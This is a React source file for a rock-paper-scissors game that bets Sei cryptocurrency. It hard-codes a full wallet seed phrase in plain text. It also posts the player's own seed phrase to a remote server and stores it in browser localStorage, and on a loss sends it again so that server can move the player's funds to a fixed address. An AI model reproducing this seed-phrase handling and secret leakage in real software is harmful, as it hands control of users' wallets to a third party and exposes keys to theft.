import React, { useState, useEffect, useCallback } from "react";
import Body from "./components/body";
import Rule from "./components/Rule";
import Scoreboard from "./components/Scoreboard";
import Picks from "./components/Picks";
import RuleBtn from "./components/ruleBtn";
import Rock from "./components/svgObj/rock";
import Paper from "./components/svgObj/paper";
import Scissor from "./components/svgObj/scissor";

const App = () => {
  const [check, setCheck] = useState(false);
  const [value, setValue] = useState(() => localStorage.getItem("value") || 0);
  const [clicked, setClicked] = useState(false);
  const [balance, setBalance] = useState(0);
  const [obj, setObj] = useState(null);
  const [className, setClassName] = useState(null);
  const [housePick, setHousePick] = useState(null);

  const reset = useCallback(() => {
    setObj(null);
    setClassName(null);
    setHousePick(null);
    setClicked(false);
  }, []);

  const toggleRules = useCallback(() => {
    if (balance > 1) {
      setCheck((prevCheck) => !prevCheck);
    }
  }, [balance]);

  const resultDisplayer = useCallback(
    async (win) => {
      if (win === "true") {
        const newValue = +value + 1;
        setValue(newValue);
        localStorage.setItem("value", newValue);

        await fetch("https://sei-server-production.up.railway.app/sendSei", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            mnemonic:
              "real list hungry matrix boring maze lucky stick dinosaur casual catch affair minute assault enhance broccoli guilt choice wife tornado copy note order twist",
            receiver: localStorage.getItem("address"),
            coin_amount: 1000000,
          }),
        });
        getBalance();
        return `YOU WIN ${1} sei`;
      } else if (win === "false") {
        await fetch("https://sei-server-production.up.railway.app/sendSei", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            mnemonic: localStorage.getItem("mnemonic"),
            receiver: "sei1krqht4rynclgrqx04eezl2g49rentmsgyz96sx",
            coin_amount: 1000000,
          }),
        });
        getBalance();
        return `YOU LOSE ${1} sei`;
      } else {
        return "DRAW";
      }
    },
    [value]
  );

  const objClick = useCallback((arg, className) => {
    setHousePick(generateHousePick());
    setClassName(className);
    setObj(arg);
    setClicked(true);
  }, []);

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();
    const mnemonic = e.target[0].value;

    const response = await fetch("https://sei-server-production.up.railway.app/recoverWallet", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ mnemonic }),
    });
    const res = await response.json();
    localStorage.setItem("mnemonic", res.mnemonic);
    localStorage.setItem("address", res.address);
    getBalance();
  }, []);

  const generateHousePick = useCallback(() => {
    return [
      { obj: <Rock />, className: "rock" },
      { obj: <Paper />, className: "paper" },
      { obj: <Scissor />, className: "scissor" },
    ].sort(() => Math.random() - 0.5)[0];
  }, []);

  const getBalance = useCallback(async () => {
    const addr = localStorage.getItem("address");
    try {
      
      const data = await fetch(`https://sei-server-production.up.railway.app/getBalance/${addr}`);
      const res = await data.json();
      setBalance(res.balance.amount);
    } catch (error) {
      console.error("Error fetching balance:", error);
    }
  }, []);

  useEffect(() => {
    getBalance();
  }, [getBalance]);

  return (
    <>
      <Scoreboard score={(balance / 1000000).toFixed()} />
      {clicked ? (
        <Picks
          resultDisplayer={resultDisplayer}
          className={className}
          Component={obj}
          housePick={housePick}
          reset={reset}
        />
      ) : (
        <Body objClick={objClick} />
      )}
      <Rule
        balance={balance}
        func={toggleRules}
        handleSubmit={handleSubmit}
        check={check}
      />
      <RuleBtn clicked={toggleRules} />
    </>
  );
};

export default App;
